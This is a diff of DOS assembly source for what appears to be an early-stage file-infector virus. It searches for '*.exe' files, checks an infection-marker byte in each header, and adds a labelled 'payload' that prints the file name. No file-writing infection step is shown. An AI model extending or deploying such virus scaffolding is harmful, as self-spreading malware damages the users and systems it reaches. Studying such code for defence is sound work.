@@ -42,21 +42,72 @@ lea dx,header
 int 21h
 
 ; check for infection
-cmp byte ptr ds:[header+13h], 69h
+cmp byte ptr cs:[header+13h], 69h
 jz find_next
+
+; saving file_descriptor
+mov file_descriptor, bx
 
 ; closing file
 mov ah, 3eh
 int 21h
 
-; saving file_descriptor
-mov file_descriptor, bx
+; PAYLOAD BEGIN
+
+lea dx, file.fname
+call str_f2c
+mov ah, 09h
+int 21h
+
+; PAYLOAD END
 
 ; exit program
 mov ah, 4ch
 int 21h
 
-; data
+procedures:
+
+str_f2c proc
+    push cx
+    push bx
+    mov cx, 13
+    str_f2c_lp:
+    mov bx, dx
+    add bx, 13
+    sub bx, cx
+    cmp byte ptr[bx], 0
+    jz str_f2c_ch
+    loop str_f2c_lp
+    str_f2c_popret:
+    pop bx
+    pop cx
+    ret
+    str_f2c_ch:
+    mov [bx], '$'
+    jmp str_f2c_popret
+str_f2c endp
+
+str_c2f proc
+    push cx
+    push bx
+    mov cx, 13
+    str_c2f_lp:
+    mov bx, dx
+    add bx, 13
+    sub bx, cx
+    cmp byte ptr[bx], '$'
+    jz str_c2f_ch
+    loop str_c2f_lp
+    str_c2f_popret:
+    pop bx
+    pop cx
+    ret
+    str_c2f_ch:
+    mov [bx], 0
+    jmp str_c2f_popret
+str_c2f endp
+
+data:
 ; DTA buffer structure
 DTAFileInfo struc
 reserved db 21 dup(?)
@@ -71,6 +122,7 @@ file DTAFileInfo <>
 
 file_descriptor dw, ?
 file_mask db '*.exe*', 0
-header db 1ah dup(?)
+header db 1ah dup(0)
+teststr db 'qwe', 0
 
 end start
